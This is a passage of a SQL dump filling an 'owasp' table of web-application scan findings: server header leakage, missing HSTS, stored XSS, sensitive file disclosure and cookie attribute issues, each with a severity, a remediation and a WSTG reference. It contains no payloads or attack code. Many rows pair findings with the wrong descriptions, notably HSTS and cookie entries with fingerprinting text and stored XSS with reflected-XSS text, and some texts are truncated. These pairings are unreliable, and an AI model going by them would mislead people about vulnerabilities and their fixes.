(106, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 105, 'Low'),
(107, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 105, 'Low'),
(108, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 106, 'High'),
(109, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 106, 'Medium'),
(110, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 106, 'Low'),
(111, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 106, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(112, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 107, 'High'),
(113, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 107, 'Medium'),
(114, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 107, 'Low'),
(115, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 107, 'Low'),
(116, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 115, 'Medium'),
(117, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 115, 'High'),
(118, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 115, 'Low'),
(119, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 115, 'Low'),
(120, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 115, 'Low'),
(125, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 130, 'Low'),
(126, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 130, 'Low'),
(127, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 130, 'Low'),
(128, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 130, 'Low'),
(129, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 135, 'Low'),
(130, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 135, 'Low'),
(131, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 135, 'Low'),
(132, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 135, 'Low'),
(133, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 149, 'Low'),
(134, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 149, 'Low'),
(135, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 149, 'Low'),
(136, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 149, 'Low'),
(137, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 151, 'Low'),
(138, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 151, 'Low'),
(139, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 151, 'Low'),
(140, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 151, 'Low'),
(141, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 152, 'Low'),
(142, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 152, 'Low'),
(143, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 152, 'Low'),
(144, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 152, 'Low'),
(145, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 153, 'Low'),
(146, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 153, 'Low'),
(147, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 153, 'Low'),
(148, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 153, 'Low'),
(149, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 154, 'Low'),
(150, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 154, 'Low'),
(151, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 154, 'Low'),
(152, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 154, 'Low'),
(153, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 157, 'Medium'),
(154, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 157, 'Low'),
(155, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 157, 'Low'),
(156, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 157, 'Low'),
(157, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 157, 'Low'),
(158, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 158, 'Medium'),
(159, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 158, 'Low'),
(160, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 158, 'Low'),
(161, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 158, 'Low'),
(162, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 158, 'Low'),
